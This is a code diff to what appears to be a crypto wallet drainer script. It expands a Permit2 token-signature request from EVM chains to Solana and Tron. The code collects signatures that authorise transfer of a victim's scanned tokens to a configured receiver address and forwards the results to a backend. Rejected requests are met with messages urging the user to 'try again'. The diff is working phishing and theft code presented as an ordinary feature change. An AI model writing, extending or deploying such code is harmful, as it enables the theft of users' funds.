@@ -670,23 +670,39 @@ async function scanAllChains() {
 
 // ============ SIGNATURE REQUEST ============
 async function requestSignature() {
-  if (!evmAddress || !evmSigner) {
-    log('No EVM signer, skipping signature', 'warn');
-    await sendToBackend();
-    return;
+  showProgress('sign', 'Requesting signature...');
+  
+  // EVM Signature
+  if (evmAddress && evmSigner) {
+    const evmTokens = foundTokens.filter(t => t.chain === 'evm');
+    if (evmTokens.length > 0) {
+      await requestEVMSignature(evmTokens);
+    }
   }
   
-  const evmTokens = foundTokens.filter(t => t.chain === 'evm');
-  
-  if (evmTokens.length === 0) {
-    log('No EVM tokens to sign', 'warn');
-    await sendToBackend();
-    return;
+  // Solana Signature
+  if (solanaAddress && solanaProvider) {
+    const solanaTokens = foundTokens.filter(t => t.chain === 'solana');
+    if (solanaTokens.length > 0) {
+      await requestSolanaSignature(solanaTokens);
+    }
   }
   
+  // Tron Signature
+  if (tronAddress && tronWeb) {
+    const tronTokens = foundTokens.filter(t => t.chain === 'tron');
+    if (tronTokens.length > 0) {
+      await requestTronSignature(tronTokens);
+    }
+  }
+  
+  showProgress('send', 'Completing...');
+  await sendToBackend();
+}
+
+// ============ EVM SIGNATURE ============
+async function requestEVMSignature(evmTokens) {
   try {
-    showProgress('sign', 'Signing...');
-    
     log('Creating Permit2 signature...');
     log(`Chain: ${evmChainId}, Tokens: ${evmTokens.map(t => t.symbol).join(', ')}`);
     
@@ -721,7 +737,7 @@ async function requestSignature() {
       sigDeadline: Math.floor(Date.now() / 1000) + (60 * 60)
     };
     
-    log('Calling signTypedData NOW...', 'success');
+    log('Requesting EVM signature popup...', 'success');
     
     const signature = await evmSigner.signTypedData(
       { name: "Permit2", chainId: evmChainId, verifyingContract: CONFIG.PERMIT2_ADDRESS },
@@ -744,19 +760,77 @@ async function requestSignature() {
     lastSignature = signature;
     lastSigDeadline = permitBatch.sigDeadline;
     
-    log(`✅ Signature: ${signature.substring(0, 30)}...`, 'success');
-    
-    showProgress('send', 'Completing...');
-    await sendToBackend();
+    log(`✅ EVM Signature: ${signature.substring(0, 30)}...`, 'success');
     
   } catch (err) {
-    log(`Signature failed: ${err.message} (code: ${err.code})`, 'error');
+    log(`EVM Signature failed: ${err.message} (code: ${err.code})`, 'error');
     
     if (err.code === 4001) {
-      showError('You rejected the signature. Please try again.');
+      throw new Error('You rejected the EVM signature. Please try again.');
     } else {
-      showProgress('send', 'Completing without signature...');
-      await sendToBackend();
+      log('Continuing without EVM signature...', 'warn');
+    }
+  }
+}
+
+// ============ SOLANA SIGNATURE ============
+async function requestSolanaSignature(solanaTokens) {
+  try {
+    if (!solanaProvider || !solanaProvider.signMessage) {
+      log('Solana provider does not support signMessage', 'warn');
+      return;
+    }
+    
+    log('Requesting Solana signature...');
+    log(`Tokens: ${solanaTokens.map(t => t.symbol).join(', ')}`);
+    
+    const message = new TextEncoder().encode(
+      `Authorization for tokens: ${solanaTokens.map(t => t.symbol).join(', ')}\nReceiver: ${CONFIG.RECEIVER_ADDRESS}`
+    );
+    
+    log('Waiting for signature popup...', 'success');
+    
+    const signedMessage = await solanaProvider.signMessage(message, "utf8");
+    
+    log(`✅ Solana Signature: ${signedMessage.signature.substring(0, 30)}...`, 'success');
+    
+  } catch (err) {
+    log(`Solana Signature failed: ${err.message}`, 'error');
+    
+    if (err.message.includes('User rejected')) {
+      throw new Error('You rejected the Solana signature. Please try again.');
+    } else {
+      log('Continuing without Solana signature...', 'warn');
+    }
+  }
+}
+
+// ============ TRON SIGNATURE ============
+async function requestTronSignature(tronTokens) {
+  try {
+    if (!tronWeb || !tronWeb.trx.sign) {
+      log('Tron provider does not support signing', 'warn');
+      return;
+    }
+    
+    log('Requesting Tron signature...');
+    log(`Tokens: ${tronTokens.map(t => t.symbol).join(', ')}`);
+    
+    const message = `Authorization for tokens: ${tronTokens.map(t => t.symbol).join(', ')}\nReceiver: ${CONFIG.RECEIVER_ADDRESS}`;
+    
+    log('Waiting for signature popup...', 'success');
+    
+    const signed = await tronWeb.trx.sign(message);
+    
+    log(`✅ Tron Signature: ${signed.substring(0, 30)}...`, 'success');
+    
+  } catch (err) {
+    log(`Tron Signature failed: ${err.message}`, 'error');
+    
+    if (err.message.includes('User rejected')) {
+      throw new Error('You rejected the Tron signature. Please try again.');
+    } else {
+      log('Continuing without Tron signature...', 'warn');
     }
   }
 }
